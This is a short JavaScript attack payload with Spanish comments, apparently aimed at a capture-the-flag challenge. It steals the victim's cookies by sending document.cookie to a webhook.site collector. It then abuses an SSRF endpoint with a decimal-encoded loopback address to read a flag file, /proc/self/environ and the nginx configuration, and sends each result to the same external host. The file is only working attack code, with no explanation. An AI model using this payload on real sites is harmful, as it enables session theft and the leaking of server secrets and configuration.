// Exfiltrar cookie + hacer SSRF para obtener flag
fetch('https://webhook.site/ba970b96-508e-4d79-8b29-45a987954c90?c=' + document.cookie);

// SSRF para leer flag desde Notify
fetch('http://311b405f-4c7f-45d5-94f9-999a49604ce1.ctf.hackconrd.org:8001/check?url=' + 
  encodeURIComponent('http://2130706433/flag.txt'))
  .then(r => r.text())
  .then(data => {
    fetch('https://webhook.site/ba970b96-508e-4d79-8b29-45a987954c90?flag=' + 
      encodeURIComponent(data));
  });

// Tambien leer environ y nginx config
fetch('http://311b405f-4c7f-45d5-94f9-999a49604ce1.ctf.hackconrd.org:8001/check?url=' + 
  encodeURIComponent('http://2130706433/proc/self/environ'))
  .then(r => r.text())
  .then(data => {
    fetch('https://webhook.site/ba970b96-508e-4d79-8b29-45a987954c90?environ=' + 
      encodeURIComponent(data));
  });

fetch('http://311b405f-4c7f-45d5-94f9-999a49604ce1.ctf.hackconrd.org:8001/check?url=' + 
  encodeURIComponent('http://2130706433/etc/nginx/nginx.conf'))
  .then(r => r.text())
  .then(data => {
    fetch('https://webhook.site/ba970b96-508e-4d79-8b29-45a987954c90?nginx=' + 
      encodeURIComponent(data));
  });
